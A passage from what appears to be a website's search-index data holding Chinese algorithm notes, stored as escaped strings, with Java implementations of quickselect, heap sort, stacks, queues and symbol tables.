}`},{header:"5. \u57FA\u4E8E\u5207\u5206\u7684\u5FEB\u901F\u9009\u62E9\u7B97\u6CD5",slug:"_5-\u57FA\u4E8E\u5207\u5206\u7684\u5FEB\u901F\u9009\u62E9\u7B97\u6CD5",content:`\u5FEB\u901F\u6392\u5E8F\u7684 partition() \u65B9\u6CD5\uFF0C\u4F1A\u8FD4\u56DE\u4E00\u4E2A\u6574\u6570 j \u4F7F\u5F97 a[l..j-1] \u5C0F\u4E8E\u7B49\u4E8E a[j]\uFF0C\u4E14 a[j+1..h] \u5927\u4E8E\u7B49\u4E8E a[j]\uFF0C\u6B64\u65F6 a[j] \u5C31\u662F\u6570\u7EC4\u7684\u7B2C j \u5927\u5143\u7D20\u3002
\u53EF\u4EE5\u5229\u7528\u8FD9\u4E2A\u7279\u6027\u627E\u51FA\u6570\u7EC4\u7684\u7B2C k \u4E2A\u5143\u7D20\u3002
\u8BE5\u7B97\u6CD5\u662F\u7EBF\u6027\u7EA7\u522B\u7684\uFF0C\u5047\u8BBE\u6BCF\u6B21\u80FD\u5C06\u6570\u7EC4\u4E8C\u5206\uFF0C\u90A3\u4E48\u6BD4\u8F83\u7684\u603B\u6B21\u6570\u4E3A (N+N/2+N/4+..)\uFF0C\u76F4\u5230\u627E\u5230\u7B2C k \u4E2A\u5143\u7D20\uFF0C\u8FD9\u4E2A\u548C\u663E\u7136\u5C0F\u4E8E 2N\u3002
public T select(T[] nums, int k) { int l = 0, h = nums.length - 1; while (h > l) { int j = partition(nums, l, h); if (j == k) { return nums[k]; } else if (j > k) { h = j - 1; } else { l = j + 1; } } return nums[k];
}`},{header:"\u5806\u6392\u5E8F",slug:"\u5806\u6392\u5E8F",content:""},{header:"1. \u5806",slug:"_1-\u5806",content:`\u5806\u4E2D\u67D0\u4E2A\u8282\u70B9\u7684\u503C\u603B\u662F\u5927\u4E8E\u7B49\u4E8E\u6216\u5C0F\u4E8E\u7B49\u4E8E\u5176\u5B50\u8282\u70B9\u7684\u503C\uFF0C\u5E76\u4E14\u5806\u662F\u4E00\u9897\u5B8C\u5168\u4E8C\u53C9\u6811\u3002
\u5806\u53EF\u4EE5\u7528\u6570\u7EC4\u6765\u8868\u793A\uFF0C\u8FD9\u662F\u56E0\u4E3A\u5806\u662F\u5B8C\u5168\u4E8C\u53C9\u6811\uFF0C\u800C\u5B8C\u5168\u4E8C\u53C9\u6811\u5F88\u5BB9\u6613\u5C31\u5B58\u50A8\u5728\u6570\u7EC4\u4E2D\u3002\u4F4D\u7F6E k \u7684\u8282\u70B9\u7684\u7236\u8282\u70B9\u4F4D\u7F6E\u4E3A k/2\uFF0C\u800C\u5B83\u7684\u4E24\u4E2A\u5B50\u8282\u70B9\u7684\u4F4D\u7F6E\u5206\u522B\u4E3A 2k \u548C 2k+1\u3002\u8FD9\u91CC\u4E0D\u4F7F\u7528\u6570\u7EC4\u7D22\u5F15\u4E3A 0 \u7684\u4F4D\u7F6E\uFF0C\u662F\u4E3A\u4E86\u66F4\u6E05\u6670\u5730\u63CF\u8FF0\u8282\u70B9\u7684\u4F4D\u7F6E\u5173\u7CFB\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f48883c8-9d8a-494e-99a4-317d8ddb8552.png" width="170px">
public class Heap<T extends Comparable<T>> { private T[] heap; private int N = 0; public Heap(int maxN) { this.heap = (T[]) new Comparable[maxN + 1]; } public boolean isEmpty() { return N == 0; } public int size() { return N; } private boolean less(int i, int j) { return heap[i].compareTo(heap[j]) < 0; } private void swap(int i, int j) { T t = heap[i]; heap[i] = heap[j]; heap[j] = t; }
}`},{header:"2. \u4E0A\u6D6E\u548C\u4E0B\u6C89",slug:"_2-\u4E0A\u6D6E\u548C\u4E0B\u6C89",content:`\u5728\u5806\u4E2D\uFF0C\u5F53\u4E00\u4E2A\u8282\u70B9\u6BD4\u7236\u8282\u70B9\u5927\uFF0C\u90A3\u4E48\u9700\u8981\u4EA4\u6362\u8FD9\u4E2A\u4E24\u4E2A\u8282\u70B9\u3002\u4EA4\u6362\u540E\u8FD8\u53EF\u80FD\u6BD4\u5B83\u65B0\u7684\u7236\u8282\u70B9\u5927\uFF0C\u56E0\u6B64\u9700\u8981\u4E0D\u65AD\u5730\u8FDB\u884C\u6BD4\u8F83\u548C\u4EA4\u6362\u64CD\u4F5C\uFF0C\u628A\u8FD9\u79CD\u64CD\u4F5C\u79F0\u4E3A\u4E0A\u6D6E\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/99d5e84e-fc2a-49a3-8259-8de274617756.gif" width="270px">
private void swim(int k) { while (k > 1 && less(k / 2, k)) { swap(k / 2, k); k = k / 2; }
}
\u7C7B\u4F3C\u5730\uFF0C\u5F53\u4E00\u4E2A\u8282\u70B9\u6BD4\u5B50\u8282\u70B9\u6765\u5F97\u5C0F\uFF0C\u4E5F\u9700\u8981\u4E0D\u65AD\u5730\u5411\u4E0B\u8FDB\u884C\u6BD4\u8F83\u548C\u4EA4\u6362\u64CD\u4F5C\uFF0C\u628A\u8FD9\u79CD\u64CD\u4F5C\u79F0\u4E3A\u4E0B\u6C89\u3002\u4E00\u4E2A\u8282\u70B9\u5982\u679C\u6709\u4E24\u4E2A\u5B50\u8282\u70B9\uFF0C\u5E94\u5F53\u4E0E\u4E24\u4E2A\u5B50\u8282\u70B9\u4E2D\u6700\u5927\u90A3\u4E2A\u8282\u70B9\u8FDB\u884C\u4EA4\u6362\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/4bf5e3fb-a285-4138-b3b6-780956eb1df1.gif" width="270px">
private void sink(int k) { while (2 * k <= N) { int j = 2 * k; if (j < N && less(j, j + 1)) j++; if (!less(k, j)) break; swap(k, j); k = j; }
}`},{header:"3. \u63D2\u5165\u5143\u7D20",slug:"_3-\u63D2\u5165\u5143\u7D20",content:`\u5C06\u65B0\u5143\u7D20\u653E\u5230\u6570\u7EC4\u672B\u5C3E\uFF0C\u7136\u540E\u4E0A\u6D6E\u5230\u5408\u9002\u7684\u4F4D\u7F6E\u3002
public void insert(Comparable v) { heap[++N] = v; swim(N);
}`},{header:"4. \u5220\u9664\u6700\u5927\u5143\u7D20",slug:"_4-\u5220\u9664\u6700\u5927\u5143\u7D20",content:`\u4ECE\u6570\u7EC4\u9876\u7AEF\u5220\u9664\u6700\u5927\u7684\u5143\u7D20\uFF0C\u5E76\u5C06\u6570\u7EC4\u7684\u6700\u540E\u4E00\u4E2A\u5143\u7D20\u653E\u5230\u9876\u7AEF\uFF0C\u5E76\u8BA9\u8FD9\u4E2A\u5143\u7D20\u4E0B\u6C89\u5230\u5408\u9002\u7684\u4F4D\u7F6E\u3002
public T delMax() { T max = heap[1]; swap(1, N--); heap[N + 1] = null; sink(1); return max;
}`},{header:"5. \u5806\u6392\u5E8F",slug:"_5-\u5806\u6392\u5E8F",content:"\u628A\u6700\u5927\u5143\u7D20\u548C\u5F53\u524D\u5806\u4E2D\u6570\u7EC4\u7684\u6700\u540E\u4E00\u4E2A\u5143\u7D20\u4EA4\u6362\u4F4D\u7F6E\uFF0C\u5E76\u4E14\u4E0D\u5220\u9664\u5B83\uFF0C\u90A3\u4E48\u5C31\u53EF\u4EE5\u5F97\u5230\u4E00\u4E2A\u4ECE\u5C3E\u5230\u5934\u7684\u9012\u51CF\u5E8F\u5217\uFF0C\u4ECE\u6B63\u5411\u6765\u770B\u5C31\u662F\u4E00\u4E2A\u9012\u589E\u5E8F\u5217\uFF0C\u8FD9\u5C31\u662F\u5806\u6392\u5E8F\u3002"},{header:"5.1 \u6784\u5EFA\u5806",slug:"_5-1-\u6784\u5EFA\u5806",content:`\u65E0\u5E8F\u6570\u7EC4\u5EFA\u7ACB\u5806\u6700\u76F4\u63A5\u7684\u65B9\u6CD5\u662F\u4ECE\u5DE6\u5230\u53F3\u904D\u5386\u6570\u7EC4\u8FDB\u884C\u4E0A\u6D6E\u64CD\u4F5C\u3002\u4E00\u4E2A\u66F4\u9AD8\u6548\u7684\u65B9\u6CD5\u662F\u4ECE\u53F3\u81F3\u5DE6\u8FDB\u884C\u4E0B\u6C89\u64CD\u4F5C\uFF0C\u5982\u679C\u4E00\u4E2A\u8282\u70B9\u7684\u4E24\u4E2A\u8282\u70B9\u90FD\u5DF2\u7ECF\u662F\u5806\u6709\u5E8F\uFF0C\u90A3\u4E48\u8FDB\u884C\u4E0B\u6C89\u64CD\u4F5C\u53EF\u4EE5\u4F7F\u5F97\u8FD9\u4E2A\u8282\u70B9\u4E3A\u6839\u8282\u70B9\u7684\u5806\u6709\u5E8F\u3002\u53F6\u5B50\u8282\u70B9\u4E0D\u9700\u8981\u8FDB\u884C\u4E0B\u6C89\u64CD\u4F5C\uFF0C\u53EF\u4EE5\u5FFD\u7565\u53F6\u5B50\u8282\u70B9\u7684\u5143\u7D20\uFF0C\u56E0\u6B64\u53EA\u9700\u8981\u904D\u5386\u4E00\u534A\u7684\u5143\u7D20\u5373\u53EF\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/c2ca8dd2-8d00-4a3e-bece-db7849ac9cfd.gif" width="210px">`},{header:"5.2 \u4EA4\u6362\u5806\u9876\u5143\u7D20\u4E0E\u6700\u540E\u4E00\u4E2A\u5143\u7D20",slug:"_5-2-\u4EA4\u6362\u5806\u9876\u5143\u7D20\u4E0E\u6700\u540E\u4E00\u4E2A\u5143\u7D20",content:`\u4EA4\u6362\u4E4B\u540E\u9700\u8981\u8FDB\u884C\u4E0B\u6C89\u64CD\u4F5C\u7EF4\u6301\u5806\u7684\u6709\u5E8F\u72B6\u6001\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/d156bcda-ac8d-4324-95e0-0c8df41567c9.gif" width="250px">
public class HeapSort<T extends Comparable<T>> extends Sort<T> { /** * \u6570\u7EC4\u7B2C 0 \u4E2A\u4F4D\u7F6E\u4E0D\u80FD\u6709\u5143\u7D20 */ @Override public void sort(T[] nums) { int N = nums.length - 1; for (int k = N / 2; k >= 1; k--) sink(nums, k, N); while (N > 1) { swap(nums, 1, N--); sink(nums, 1, N); } } private void sink(T[] nums, int k, int N) { while (2 * k <= N) { int j = 2 * k; if (j < N && less(nums, j, j + 1)) j++; if (!less(nums, k, j)) break; swap(nums, k, j); k = j; } } private boolean less(T[] nums, int i, int j) { return nums[i].compareTo(nums[j]) < 0; }
}`},{header:"6. \u5206\u6790",slug:"_6-\u5206\u6790",content:`\u4E00\u4E2A\u5806\u7684\u9AD8\u5EA6\u4E3A logN\uFF0C\u56E0\u6B64\u5728\u5806\u4E2D\u63D2\u5165\u5143\u7D20\u548C\u5220\u9664\u6700\u5927\u5143\u7D20\u7684\u590D\u6742\u5EA6\u90FD\u4E3A logN\u3002
\u5BF9\u4E8E\u5806\u6392\u5E8F\uFF0C\u7531\u4E8E\u8981\u5BF9 N \u4E2A\u8282\u70B9\u8FDB\u884C\u4E0B\u6C89\u64CD\u4F5C\uFF0C\u56E0\u6B64\u590D\u6742\u5EA6\u4E3A NlogN\u3002
\u5806\u6392\u5E8F\u662F\u4E00\u79CD\u539F\u5730\u6392\u5E8F\uFF0C\u6CA1\u6709\u5229\u7528\u989D\u5916\u7684\u7A7A\u95F4\u3002
\u73B0\u4EE3\u64CD\u4F5C\u7CFB\u7EDF\u5F88\u5C11\u4F7F\u7528\u5806\u6392\u5E8F\uFF0C\u56E0\u4E3A\u5B83\u65E0\u6CD5\u5229\u7528\u5C40\u90E8\u6027\u539F\u7406\u8FDB\u884C\u7F13\u5B58\uFF0C\u4E5F\u5C31\u662F\u6570\u7EC4\u5143\u7D20\u5F88\u5C11\u548C\u76F8\u90BB\u7684\u5143\u7D20\u8FDB\u884C\u6BD4\u8F83\u548C\u4EA4\u6362\u3002`},{header:"\u5C0F\u7ED3",slug:"\u5C0F\u7ED3",content:""},{header:"1. \u6392\u5E8F\u7B97\u6CD5\u7684\u6BD4\u8F83",slug:"_1-\u6392\u5E8F\u7B97\u6CD5\u7684\u6BD4\u8F83",content:`\u7B97\u6CD5
\u7A33\u5B9A\u6027
\u65F6\u95F4\u590D\u6742\u5EA6
\u7A7A\u95F4\u590D\u6742\u5EA6
\u5907\u6CE8 \u9009\u62E9\u6392\u5E8F
\xD7
N2
1 \u5192\u6CE1\u6392\u5E8F
\u221A
N2
1 \u63D2\u5165\u6392\u5E8F
\u221A
N ~ N2
1
\u65F6\u95F4\u590D\u6742\u5EA6\u548C\u521D\u59CB\u987A\u5E8F\u6709\u5173 \u5E0C\u5C14\u6392\u5E8F
\xD7
N \u7684\u82E5\u5E72\u500D\u4E58\u4E8E\u9012\u589E\u5E8F\u5217\u7684\u957F\u5EA6
1
\u6539\u8FDB\u7248\u63D2\u5165\u6392\u5E8F \u5FEB\u901F\u6392\u5E8F
\xD7
NlogN
logN \u4E09\u5411\u5207\u5206\u5FEB\u901F\u6392\u5E8F
\xD7
N ~ NlogN
logN
\u9002\u7528\u4E8E\u6709\u5927\u91CF\u91CD\u590D\u4E3B\u952E \u5F52\u5E76\u6392\u5E8F
\u221A
NlogN
N \u5806\u6392\u5E8F
\xD7
NlogN
1
\u65E0\u6CD5\u5229\u7528\u5C40\u90E8\u6027\u539F\u7406 \u5FEB\u901F\u6392\u5E8F\u662F\u6700\u5FEB\u7684\u901A\u7528\u6392\u5E8F\u7B97\u6CD5\uFF0C\u5B83\u7684\u5185\u5FAA\u73AF\u7684\u6307\u4EE4\u5F88\u5C11\uFF0C\u800C\u4E14\u5B83\u8FD8\u80FD\u5229\u7528\u7F13\u5B58\uFF0C\u56E0\u4E3A\u5B83\u603B\u662F\u987A\u5E8F\u5730\u8BBF\u95EE\u6570\u636E\u3002\u5B83\u7684\u8FD0\u884C\u65F6\u95F4\u8FD1\u4F3C\u4E3A ~cNlogN\uFF0C\u8FD9\u91CC\u7684 c \u6BD4\u5176\u5B83\u7EBF\u6027\u5BF9\u6570\u7EA7\u522B\u7684\u6392\u5E8F\u7B97\u6CD5\u90FD\u8981\u5C0F\u3002
\u4F7F\u7528\u4E09\u5411\u5207\u5206\u5FEB\u901F\u6392\u5E8F\uFF0C\u5B9E\u9645\u5E94\u7528\u4E2D\u53EF\u80FD\u51FA\u73B0\u7684\u67D0\u4E9B\u5206\u5E03\u7684\u8F93\u5165\u80FD\u591F\u8FBE\u5230\u7EBF\u6027\u7EA7\u522B\uFF0C\u800C\u5176\u5B83\u6392\u5E8F\u7B97\u6CD5\u4ECD\u7136\u9700\u8981\u7EBF\u6027\u5BF9\u6570\u65F6\u95F4\u3002`},{header:"2. Java \u7684\u6392\u5E8F\u7B97\u6CD5\u5B9E\u73B0",slug:"_2-java-\u7684\u6392\u5E8F\u7B97\u6CD5\u5B9E\u73B0",content:"Java \u4E3B\u8981\u6392\u5E8F\u65B9\u6CD5\u4E3A java.util.Arrays.sort()\uFF0C\u5BF9\u4E8E\u539F\u59CB\u6570\u636E\u7C7B\u578B\u4F7F\u7528\u4E09\u5411\u5207\u5206\u7684\u5FEB\u901F\u6392\u5E8F\uFF0C\u5BF9\u4E8E\u5F15\u7528\u7C7B\u578B\u4F7F\u7528\u5F52\u5E76\u6392\u5E8F\u3002"}]},{path:"/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95%20-%20%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97.html",title:"\u7B97\u6CD5 - \u6808\u548C\u961F\u5217",pathLocale:"/",contents:[{header:"\u7B97\u6CD5 - \u6808\u548C\u961F\u5217",slug:"\u7B97\u6CD5-\u6808\u548C\u961F\u5217",content:`\u7B97\u6CD5 - \u6808\u548C\u961F\u5217 \u6808 1. \u6570\u7EC4\u5B9E\u73B0
2. \u94FE\u8868\u5B9E\u73B0 \u961F\u5217`},{header:"\u6808",slug:"\u6808",content:"public interface MyStack<Item> extends Iterable<Item> { MyStack<Item> push(Item item); Item pop() throws Exception; boolean isEmpty(); int size(); }"},{header:"1. \u6570\u7EC4\u5B9E\u73B0",slug:"_1-\u6570\u7EC4\u5B9E\u73B0",content:`public class ArrayStack<Item> implements MyStack<Item> { // \u6808\u5143\u7D20\u6570\u7EC4\uFF0C\u53EA\u80FD\u901A\u8FC7\u8F6C\u578B\u6765\u521B\u5EFA\u6CDB\u578B\u6570\u7EC4 private Item[] a = (Item[]) new Object[1]; // \u5143\u7D20\u6570\u91CF private int N = 0; @Override public MyStack<Item> push(Item item) { check(); a[N++] = item; return this; } @Override public Item pop() throws Exception { if (isEmpty()) { throw new Exception("stack is empty"); } Item item = a[--N]; check(); // \u907F\u514D\u5BF9\u8C61\u6E38\u79BB a[N] = null; return item; } private void check() { if (N >= a.length) { resize(2 * a.length); } else if (N > 0 && N <= a.length / 4) { resize(a.length / 2); } } /** * \u8C03\u6574\u6570\u7EC4\u5927\u5C0F\uFF0C\u4F7F\u5F97\u6808\u5177\u6709\u4F38\u7F29\u6027 */ private void resize(int size) { Item[] tmp = (Item[]) new Object[size]; for (int i = 0; i < N; i++) { tmp[i] = a[i]; } a = tmp; } @Override public boolean isEmpty() { return N == 0; } @Override public int size() { return N; } @Override public Iterator<Item> iterator() { // \u8FD4\u56DE\u9006\u5E8F\u904D\u5386\u7684\u8FED\u4EE3\u5668 return new Iterator<Item>() { private int i = N; @Override public boolean hasNext() { return i > 0; } @Override public Item next() { return a[--i]; } }; }
}`},{header:"2. \u94FE\u8868\u5B9E\u73B0",slug:"_2-\u94FE\u8868\u5B9E\u73B0",content:`\u9700\u8981\u4F7F\u7528\u94FE\u8868\u7684\u5934\u63D2\u6CD5\u6765\u5B9E\u73B0\uFF0C\u56E0\u4E3A\u5934\u63D2\u6CD5\u4E2D\u6700\u540E\u538B\u5165\u6808\u7684\u5143\u7D20\u5728\u94FE\u8868\u7684\u5F00\u5934\uFF0C\u5B83\u7684 next \u6307\u9488\u6307\u5411\u524D\u4E00\u4E2A\u538B\u5165\u6808\u7684\u5143\u7D20\uFF0C\u5728\u5F39\u51FA\u5143\u7D20\u65F6\u5C31\u53EF\u4EE5\u901A\u8FC7 next \u6307\u9488\u904D\u5386\u5230\u524D\u4E00\u4E2A\u538B\u5165\u6808\u7684\u5143\u7D20\u4ECE\u800C\u8BA9\u8FD9\u4E2A\u5143\u7D20\u6210\u4E3A\u65B0\u7684\u6808\u9876\u5143\u7D20\u3002
public class ListStack<Item> implements MyStack<Item> { private Node top = null; private int N = 0; private class Node { Item item; Node next; } @Override public MyStack<Item> push(Item item) { Node newTop = new Node(); newTop.item = item; newTop.next = top; top = newTop; N++; return this; } @Override public Item pop() throws Exception { if (isEmpty()) { throw new Exception("stack is empty"); } Item item = top.item; top = top.next; N--; return item; } @Override public boolean isEmpty() { return N == 0; } @Override public int size() { return N; } @Override public Iterator<Item> iterator() { return new Iterator<Item>() { private Node cur = top; @Override public boolean hasNext() { return cur != null; } @Override public Item next() { Item item = cur.item; cur = cur.next; return item; } }; }
}`},{header:"\u961F\u5217",slug:"\u961F\u5217",content:`\u4E0B\u9762\u662F\u961F\u5217\u7684\u94FE\u8868\u5B9E\u73B0\uFF0C\u9700\u8981\u7EF4\u62A4 first \u548C last \u8282\u70B9\u6307\u9488\uFF0C\u5206\u522B\u6307\u5411\u961F\u9996\u548C\u961F\u5C3E\u3002
\u8FD9\u91CC\u9700\u8981\u8003\u8651 first \u548C last \u6307\u9488\u54EA\u4E2A\u4F5C\u4E3A\u94FE\u8868\u7684\u5F00\u5934\u3002\u56E0\u4E3A\u51FA\u961F\u5217\u64CD\u4F5C\u9700\u8981\u8BA9\u961F\u9996\u5143\u7D20\u7684\u4E0B\u4E00\u4E2A\u5143\u7D20\u6210\u4E3A\u961F\u9996\uFF0C\u6240\u4EE5\u9700\u8981\u5BB9\u6613\u83B7\u53D6\u4E0B\u4E00\u4E2A\u5143\u7D20\uFF0C\u800C\u94FE\u8868\u7684\u5934\u90E8\u8282\u70B9\u7684 next \u6307\u9488\u6307\u5411\u4E0B\u4E00\u4E2A\u5143\u7D20\uFF0C\u56E0\u6B64\u53EF\u4EE5\u8BA9 first \u6307\u9488\u94FE\u8868\u7684\u5F00\u5934\u3002
public interface MyQueue<Item> extends Iterable<Item> { int size(); boolean isEmpty(); MyQueue<Item> add(Item item); Item remove() throws Exception;
}
public class ListQueue<Item> implements MyQueue<Item> { private Node first; private Node last; int N = 0; private class Node { Item item; Node next; } @Override public boolean isEmpty() { return N == 0; } @Override public int size() { return N; } @Override public MyQueue<Item> add(Item item) { Node newNode = new Node(); newNode.item = item; newNode.next = null; if (isEmpty()) { last = newNode; first = newNode; } else { last.next = newNode; last = newNode; } N++; return this; } @Override public Item remove() throws Exception { if (isEmpty()) { throw new Exception("queue is empty"); } Node node = first; first = first.next; N--; if (isEmpty()) { last = null; } return node.item; } @Override public Iterator<Item> iterator() { return new Iterator<Item>() { Node cur = first; @Override public boolean hasNext() { return cur != null; } @Override public Item next() { Item item = cur.item; cur = cur.next; return item; } }; }
}`}]},{path:"/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95%20-%20%E7%9B%AE%E5%BD%95.html",title:"\u7B97\u6CD5\u76EE\u5F55",pathLocale:"/",contents:[{header:"\u7B97\u6CD5\u76EE\u5F55",slug:"\u7B97\u6CD5\u76EE\u5F55",content:`\u7B97\u6CD5\u5206\u6790
\u6392\u5E8F
\u5E76\u67E5\u96C6
\u6808\u548C\u961F\u5217
\u7B26\u53F7\u8868
\u5176\u5B83`},{header:"\u53C2\u8003\u8D44\u6599",slug:"\u53C2\u8003\u8D44\u6599",content:"Sedgewick, Robert, and Kevin Wayne. Algorithms. Addison-Wesley Professional, 2011."}]},{path:"/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95%20-%20%E7%AC%A6%E5%8F%B7%E8%A1%A8.html",title:"\u7B97\u6CD5 - \u7B26\u53F7\u8868",pathLocale:"/",contents:[{header:"\u7B97\u6CD5 - \u7B26\u53F7\u8868",slug:"\u7B97\u6CD5-\u7B26\u53F7\u8868",content:`\u7B97\u6CD5 - \u7B26\u53F7\u8868 \u524D\u8A00
\u521D\u7EA7\u5B9E\u73B0 1. \u94FE\u8868\u5B9E\u73B0\u65E0\u5E8F\u7B26\u53F7\u8868
2. \u4E8C\u5206\u67E5\u627E\u5B9E\u73B0\u6709\u5E8F\u7B26\u53F7\u8868 \u4E8C\u53C9\u67E5\u627E\u6811 1. get()
2. put()
3. \u5206\u6790
4. floor()
5. rank()
6. min()
7. deleteMin()
8. delete()
9. keys()
10. \u5206\u6790 2-3 \u67E5\u627E\u6811 1. \u63D2\u5165\u64CD\u4F5C
2. \u6027\u8D28 \u7EA2\u9ED1\u6811 1. \u5DE6\u65CB\u8F6C
2. \u53F3\u65CB\u8F6C
3. \u989C\u8272\u8F6C\u6362
4. \u63D2\u5165
5. \u5206\u6790 \u6563\u5217\u8868 1. \u6563\u5217\u51FD\u6570
2. \u62C9\u94FE\u6CD5
3. \u7EBF\u6027\u63A2\u6D4B\u6CD5 \u5C0F\u7ED3 1. \u7B26\u53F7\u8868\u7B97\u6CD5\u6BD4\u8F83
2. Java \u7684\u7B26\u53F7\u8868\u5B9E\u73B0
3. \u7A00\u758F\u5411\u91CF\u4E58\u6CD5`},{header:"\u524D\u8A00",slug:"\u524D\u8A00",content:`\u7B26\u53F7\u8868\uFF08Symbol Table\uFF09\u662F\u4E00\u79CD\u5B58\u50A8\u952E\u503C\u5BF9\u7684\u6570\u636E\u7ED3\u6784\uFF0C\u53EF\u4EE5\u652F\u6301\u5FEB\u901F\u67E5\u627E\u64CD\u4F5C\u3002
\u7B26\u53F7\u8868\u5206\u4E3A\u6709\u5E8F\u548C\u65E0\u5E8F\u4E24\u79CD\uFF0C\u6709\u5E8F\u7B26\u53F7\u8868\u4E3B\u8981\u6307\u652F\u6301 min()\u3001max() \u7B49\u6839\u636E\u952E\u7684\u5927\u5C0F\u5173\u7CFB\u6765\u5B9E\u73B0\u7684\u64CD\u4F5C\u3002
\u6709\u5E8F\u7B26\u53F7\u8868\u7684\u952E\u9700\u8981\u5B9E\u73B0 Comparable \u63A5\u53E3\u3002
public interface UnorderedST<Key, Value> { int size(); Value get(Key key); void put(Key key, Value value); void delete(Key key);
}
public interface OrderedST<Key extends Comparable<Key>, Value> { int size(); void put(Key key, Value value); Value get(Key key); Key min(); Key max(); int rank(Key key); List<Key> keys(Key l, Key h);
}`},{header:"\u521D\u7EA7\u5B9E\u73B0",slug:"\u521D\u7EA7\u5B9E\u73B0",content:""},{header:"1. \u94FE\u8868\u5B9E\u73B0\u65E0\u5E8F\u7B26\u53F7\u8868",slug:"_1-\u94FE\u8868\u5B9E\u73B0\u65E0\u5E8F\u7B26\u53F7\u8868",content:`public class ListUnorderedST<Key, Value> implements UnorderedST<Key, Value> { private Node first; private class Node { Key key; Value value; Node next; Node(Key key, Value value, Node next) { this.key = key; this.value = value; this.next = next; } } @Override public int size() { int cnt = 0; Node cur = first; while (cur != null) { cnt++; cur = cur.next; } return cnt; } @Override public void put(Key key, Value value) { Node cur = first; // \u5982\u679C\u5728\u94FE\u8868\u4E2D\u627E\u5230\u8282\u70B9\u7684\u952E\u7B49\u4E8E key \u5C31\u66F4\u65B0\u8FD9\u4E2A\u8282\u70B9\u7684\u503C\u4E3A value while (cur != null) { if (cur.key.equals(key)) { cur.value = value; return; } cur = cur.next; } // \u5426\u5219\u4F7F\u7528\u5934\u63D2\u6CD5\u63D2\u5165\u4E00\u4E2A\u65B0\u8282\u70B9 first = new Node(key, value, first); } @Override public void delete(Key key) { if (first == null) return; if (first.key.equals(key)) first = first.next; Node pre = first, cur = first.next; while (cur != null) { if (cur.key.equals(key)) { pre.next = cur.next; return; } pre = pre.next; cur = cur.next; } } @Override public Value get(Key key) { Node cur = first; while (cur != null) { if (cur.key.equals(key)) return cur.value; cur = cur.next; } return null; }
}`},{header:"2. \u4E8C\u5206\u67E5\u627E\u5B9E\u73B0\u6709\u5E8F\u7B26\u53F7\u8868",slug:"_2-\u4E8C\u5206\u67E5\u627E\u5B9E\u73B0\u6709\u5E8F\u7B26\u53F7\u8868",content:`\u4F7F\u7528\u4E00\u5BF9\u5E73\u884C\u6570\u7EC4\uFF0C\u4E00\u4E2A\u5B58\u50A8\u952E\u4E00\u4E2A\u5B58\u50A8\u503C\u3002
\u4E8C\u5206\u67E5\u627E\u7684 rank() \u65B9\u6CD5\u81F3\u5173\u91CD\u8981\uFF0C\u5F53\u952E\u5728\u8868\u4E2D\u65F6\uFF0C\u5B83\u80FD\u591F\u77E5\u9053\u8BE5\u952E\u7684\u4F4D\u7F6E\uFF1B\u5F53\u952E\u4E0D\u5728\u8868\u4E2D\u65F6\uFF0C\u5B83\u4E5F\u80FD\u77E5\u9053\u5728\u4F55\u5904\u63D2\u5165\u65B0\u952E\u3002
\u4E8C\u5206\u67E5\u627E\u6700\u591A\u9700\u8981 logN+1 \u6B21\u6BD4\u8F83\uFF0C\u4F7F\u7528\u4E8C\u5206\u67E5\u627E\u5B9E\u73B0\u7684\u7B26\u53F7\u8868\u7684\u67E5\u627E\u64CD\u4F5C\u6240\u9700\u8981\u7684\u65F6\u95F4\u6700\u591A\u662F\u5BF9\u6570\u7EA7\u522B\u7684\u3002\u4F46\u662F\u63D2\u5165\u64CD\u4F5C\u9700\u8981\u79FB\u52A8\u6570\u7EC4\u5143\u7D20\uFF0C\u662F\u7EBF\u6027\u7EA7\u522B\u7684\u3002
public class BinarySearchOrderedST<Key extends Comparable<Key>, Value> implements OrderedST<Key, Value> { private Key[] keys; private Value[] values; private int N = 0; public BinarySearchOrderedST(int capacity) { keys = (Key[]) new Comparable[capacity]; values = (Value[]) new Object[capacity]; } @Override public int size() { return N; } @Override public int rank(Key key) { int l = 0, h = N - 1; while (l <= h) { int m = l + (h - l) / 2; int cmp = key.compareTo(keys[m]); if (cmp == 0) return m; else if (cmp < 0) h = m - 1; else l = m + 1; } return l; } @Override public List<Key> keys(Key l, Key h) { int index = rank(l); List<Key> list = new ArrayList<>(); while (keys[index].compareTo(h) <= 0) { list.add(keys[index]); index++; } return list; } @Override public void put(Key key, Value value) { int index = rank(key); // \u5982\u679C\u627E\u5230\u5DF2\u7ECF\u5B58\u5728\u7684\u8282\u70B9\u952E\u4E3A key\uFF0C\u5C31\u66F4\u65B0\u8FD9\u4E2A\u8282\u70B9\u7684\u503C\u4E3A value if (index < N && keys[index].compareTo(key) == 0) { values[index] = value; return; } // \u5426\u5219\u5728\u6570\u7EC4\u4E2D\u63D2\u5165\u65B0\u7684\u8282\u70B9\uFF0C\u9700\u8981\u5148\u5C06\u63D2\u5165\u4F4D\u7F6E\u4E4B\u540E\u7684\u5143\u7D20\u90FD\u5411\u540E\u79FB\u52A8\u4E00\u4E2A\u4F4D\u7F6E for (int j = N; j > index; j--) { keys[j] = keys[j - 1]; values[j] = values[j - 1]; } keys[index] = key; values[index] = value; N++; } @Override public Value get(Key key) { int index = rank(key); if (index < N && keys[index].compareTo(key) == 0) return values[index]; return null; } @Override public Key min() { return keys[0]; } @Override public Key max() { return keys[N - 1]; }
}`},{header:"\u4E8C\u53C9\u67E5\u627E\u6811",slug:"\u4E8C\u53C9\u67E5\u627E\u6811",content:`\u4E8C\u53C9\u6811 \u662F\u4E00\u4E2A\u7A7A\u94FE\u63A5\uFF0C\u6216\u8005\u662F\u4E00\u4E2A\u6709\u5DE6\u53F3\u4E24\u4E2A\u94FE\u63A5\u7684\u8282\u70B9\uFF0C\u6BCF\u4E2A\u94FE\u63A5\u90FD\u6307\u5411\u4E00\u9897\u5B50\u4E8C\u53C9\u6811\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/c11528f6-fc71-4a2b-8d2f-51b8954c38f1.jpg" width="180)
